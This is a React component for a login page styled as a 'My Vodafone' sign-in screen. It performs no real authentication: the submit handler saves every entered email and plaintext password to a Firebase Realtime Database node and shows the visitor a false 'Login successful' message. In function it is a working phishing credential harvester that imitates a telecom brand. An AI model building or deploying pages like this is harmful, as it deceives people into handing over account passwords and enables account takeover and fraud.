import { useState } from "react";
import { GoAlert } from "react-icons/go";
import { AiOutlineEye, AiOutlineEyeInvisible } from "react-icons/ai";
import { getDatabase, ref, set, push } from "firebase/database"; // Firebase Realtime Database methods

const Login = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [alertMessage, setAlertMessage] = useState("");
  const [showAlert, setShowAlert] = useState(false);
  const [showPassword, setShowPassword] = useState(false); // State for toggling password visibility

  const handleLogin = async (e) => {
    e.preventDefault();

    try {
      // Initialize the Firebase Realtime Database
      const database = getDatabase();
      
      // Create a new entry in the "users" node with email and password
      const usersRef = ref(database, 'users');
      const newUserRef = push(usersRef); // Generate a new unique key for the user

      // Save the email and password (consider hashing the password in a real app)
      await set(newUserRef, {
        email: email,
        password: password, // This should be hashed for security in a real-world scenario
        timestamp: new Date().toISOString(),
      });

      console.log("User credentials saved to Realtime Database");
      setAlertMessage("Login successful, credentials stored!");
      setShowAlert(true);
    } catch (error) {
      console.error("Error storing credentials:", error);
      setAlertMessage("Error occurred while saving data!");
      setShowAlert(true);
    }
  };

  return (
    <main className="bg-[#F2F2F2] flex justify-center items-center h-full py-8 md:py-6 lg:py-0 md:h-screen">
      <div className="bg-white border shadow-md shadow-black relative w-[90%] sm:w-[75%] lg:w-2/5">
        <div className="w-11/12 py-8 space-y-4 bg-white">
          <h1 className="text-4xl font-[330] self-start pl-14 text-gray-800">
            Log in
          </h1>
          {showAlert && (
            <div className="mt-4 w-full sm:w-3/4 md:mx-auto  mx-3 flex flex-col sm:flex-row items-stretch border-[1.5px] border-[#BD0000] overflow-hidden h-28 sm:h-32">
              <div className="bg-[#BD0000] flex items-center justify-center px-6 h-12 sm:h-full">
                <GoAlert className="text-white  text-xl sm:text-2xl" />
              </div>
              <div className="bg-white flex-1 p-2 sm:p-4 flex flex-col sm:flex-row justify-between items-center">
                <span className="text-xs sm:text-sm font-medium text-center sm:text-left">
                  {alertMessage}
                </span>
              </div>
              <button
                onClick={() => setShowAlert(false)}
                className="text-white bg-[#BD0000] border-l px-2 text-xl  font-bold h-12 sm:h-full"
              >
                &times;
              </button>
            </div>
          )}

          <form className="w-3/4 space-y-2 mx-auto" onSubmit={handleLogin}>
            <div>
              <label className="block mb-1 font-medium text-gray-700">
                Email
              </label>
              <input
                type="email"
                placeholder="Enter your email"
                className="w-full px-4 py-2 text-sm border border-gray-400 focus:outline-none focus:ring-2 focus:ring-[#0096AD]"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                required
              />
            </div>

            <div className="relative">
              <label className="block mb-1 font-medium text-gray-700">
                Password
              </label>
              <input
                type={showPassword ? "text" : "password"} // Toggle input type
                placeholder="Enter your password"
                className="w-full px-4 py-2 text-sm border border-gray-400 focus:outline-none focus:ring-2 focus:ring-[#0096AD]"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                required
              />
              <button
                type="button"
                onClick={() => setShowPassword((prev) => !prev)}
                className="absolute right-2 top-9 text-gray-600 focus:outline-none"
              >
                {showPassword ? (
                  <AiOutlineEyeInvisible size={20} />
                ) : (
                  <AiOutlineEye size={20} />
                )}
              </button>
            </div>

            <div className="text-sm">
              <a href="#">
                <div className="flex flex-col gap-2">
                  <span className="underline">Forgotten username?</span>
                  <span className="underline">
                    I don`t know my mobile number
                  </span>
                </div>
              </a>
            </div>

            <div className="pt-4">
              <button
                type="submit"
                className={`w-full py-2 text-white ${
                  email && password
                    ? "bg-[#E60000] hover:bg-red-700"
                    : "bg-[#F59E9E] cursor-not-allowed"
                } focus:outline-none`}
                disabled={!email || !password}
              >
                Continue
              </button>
            </div>
          </form>

          <div className="text-center text-sm">
            <p>
              Not registered?{" "}
              <a href="#" className="underline">
                Register for My Vodafone
              </a>
            </p>
          </div>
        </div>
      </div>
    </main>
  );
};

export default Login;
